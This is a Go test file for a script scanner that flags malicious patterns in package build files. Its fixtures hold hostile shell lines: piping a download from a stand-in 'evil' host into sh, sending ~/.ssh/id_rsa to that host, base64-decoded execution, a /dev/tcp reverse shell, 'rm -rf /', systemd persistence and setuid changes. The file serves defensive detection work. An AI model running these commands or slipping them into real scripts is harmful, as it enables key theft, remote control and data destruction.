package scanner

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// writeFile creates rel (slash-separated) under root, including any parent
// directories, with mode 0o644.
func writeFile(t *testing.T, root, rel, content string) {
	t.Helper()
	path := filepath.Join(root, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatalf("creating parent dirs for %s: %v", rel, err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("writing %s: %v", rel, err)
	}
}

func TestScanTreeFindsPipeToShell(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "build.sh", "#!/bin/sh\ncurl https://evil/x | sh\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(findingsFor(res.Findings, "source-pipe-to-shell")) != 1 {
		t.Fatalf("got %+v", res.Findings)
	}
	if res.Findings[0].File != "build.sh" || res.Findings[0].Line != 2 {
		t.Errorf("location = %+v", res.Findings[0])
	}
}

func TestScanTreeSkipsBinaryAndLargeFiles(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "blob.bin", string([]byte{0, 1, 2, 3}))
	writeFile(t, root, "big.sh", strings.Repeat("a", 2048))
	res, _ := ScanTree(root, FileOptions{MaxBytes: 1024})
	if res.FilesScanned != 0 || res.FilesSkipped != 2 {
		t.Fatalf("%+v", res)
	}
}

func TestScanTreeSkipsTestDirsUnlessDeep(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "tests/evil.sh", "curl https://evil/x | sh\n")
	shallow, _ := ScanTree(root, FileOptions{})
	if len(shallow.Findings) != 0 {
		t.Fatalf("tests scanned without deep: %+v", shallow.Findings)
	}
	deep, _ := ScanTree(root, FileOptions{Deep: true})
	if len(deep.Findings) == 0 {
		t.Fatal("deep scan missed tests/")
	}
}

func TestScanTreeTruncatesAtMaxFiles(t *testing.T) {
	root := t.TempDir()
	for i := 0; i < 10; i++ {
		writeFile(t, root, fmt.Sprintf("f%d.sh", i), "echo hi\n")
	}
	res, _ := ScanTree(root, FileOptions{MaxFiles: 3})
	if !res.Truncated || res.FilesScanned != 3 {
		t.Fatalf("%+v", res)
	}
}

func TestScanTreeCredentialEgress(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "x.sh", "cat ~/.ssh/id_rsa | curl -d @- https://evil\n")
	res, _ := ScanTree(root, FileOptions{})
	if len(findingsFor(res.Findings, "source-credential-egress")) == 0 {
		t.Fatal("missing finding")
	}
}

func TestScanTreeFindsObfuscation(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "install.sh", "#!/bin/sh\necho aGVsbG8= | base64 -d | sh\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	got := findingsFor(res.Findings, "source-obfuscation")
	if len(got) != 1 {
		t.Fatalf("got %+v", res.Findings)
	}
	if got[0].Severity != Critical || got[0].Line != 2 {
		t.Errorf("finding = %+v", got[0])
	}
}

func TestScanTreeFindsReverseShell(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "connect.sh", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	got := findingsFor(res.Findings, "source-reverse-shell")
	if len(got) != 1 {
		t.Fatalf("got %+v", res.Findings)
	}
	if got[0].Severity != Warning || got[0].Line != 2 {
		t.Errorf("finding = %+v", got[0])
	}
}

func TestScanTreeFindsDestructive(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "clean.sh", "#!/bin/sh\nrm -rf /\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	got := findingsFor(res.Findings, "source-destructive")
	if len(got) != 1 {
		t.Fatalf("got %+v", res.Findings)
	}
	if got[0].Severity != Critical {
		t.Errorf("finding = %+v", got[0])
	}
}

func TestScanTreeFindsPersistence(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "persist.sh", "#!/bin/sh\ncp evil.service /etc/systemd/system/evil.service\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	got := findingsFor(res.Findings, "source-persistence")
	if len(got) != 1 {
		t.Fatalf("got %+v", res.Findings)
	}
	if got[0].Severity != Warning {
		t.Errorf("finding = %+v", got[0])
	}
}

func TestScanTreeFindsSetuid(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "setuid.sh", "#!/bin/sh\nchmod u+s /usr/bin/tool\nchmod 4755 /usr/bin/other\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	got := findingsFor(res.Findings, "source-setuid")
	if len(got) != 2 {
		t.Fatalf("got %+v", res.Findings)
	}
	for _, f := range got {
		if f.Severity != Warning {
			t.Errorf("finding = %+v", f)
		}
	}
}

func TestScanTreeCleanScriptNoFindings(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "PKGBUILD", "pkgname=demo\n")
	writeFile(t, root, "build.sh", "#!/bin/sh\nset -euo pipefail\n./configure --prefix=/usr\nmake\nmake DESTDIR=\"$pkgdir\" install\n")
	writeFile(t, root, "notes.txt", "This package builds with make and installs to /usr.\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Findings) != 0 {
		t.Fatalf("unexpected findings: %+v", res.Findings)
	}
	if res.FilesScanned != 3 {
		t.Errorf("FilesScanned = %d, want 3", res.FilesScanned)
	}
}

func TestScanTreeCredentialEgressNeedsWordBoundary(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "shell.sh", "function sync_keys() {\n  cat ~/.ssh/known_hosts\n}\n")
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsFor(res.Findings, "source-credential-egress"); len(got) != 0 {
		t.Fatalf("false positive: %+v", got)
	}
}

func TestScanTreeIgnoreDirsOverride(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "tests/evil.sh", "curl https://evil/x | sh\n")
	writeFile(t, root, "secret/evil.sh", "curl https://evil/x | sh\n")
	res, err := ScanTree(root, FileOptions{IgnoreDirs: []string{"secret"}})
	if err != nil {
		t.Fatal(err)
	}
	got := findingsFor(res.Findings, "source-pipe-to-shell")
	if len(got) != 1 || got[0].File != "tests/evil.sh" {
		t.Fatalf("got %+v", res.Findings)
	}
}

func TestScanTreeSkipsSymlinks(t *testing.T) {
	root := t.TempDir()
	writeFile(t, root, "real.sh", "echo hi\n")
	if err := os.Symlink(filepath.Join(root, "real.sh"), filepath.Join(root, "link.sh")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if res.FilesScanned != 1 || res.FilesSkipped != 0 {
		t.Fatalf("%+v", res)
	}
}

// A mode-000 directory must not abort the scan of the rest of the tree.
func TestScanTreeUnreadableDirIsNonFatal(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("root bypasses permission bits")
	}
	root := t.TempDir()
	writeFile(t, root, "blocked/evil.sh", "curl https://evil/x | sh\n")
	writeFile(t, root, "ok.sh", "curl https://evil/x | sh\n")
	blocked := filepath.Join(root, "blocked")
	if err := os.Chmod(blocked, 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := os.Chmod(blocked, 0o755); err != nil {
			t.Errorf("restoring blocked dir: %v", err)
		}
	})

	res, err := ScanTree(root, FileOptions{})
	if err != nil {
		t.Fatalf("scan aborted on unreadable dir: %v", err)
	}
	got := findingsFor(res.Findings, "source-pipe-to-shell")
	if len(got) != 1 || got[0].File != "ok.sh" {
		t.Fatalf("got %+v", res.Findings)
	}
	if res.FilesSkipped < 1 {
		t.Errorf("FilesSkipped = %d, want >= 1", res.FilesSkipped)
	}
}

func TestScanTreeMissingRootErrors(t *testing.T) {
	root := filepath.Join(t.TempDir(), "does-not-exist")
	if _, err := ScanTree(root, FileOptions{}); err == nil {
		t.Fatal("expected error for missing root")
	}
}
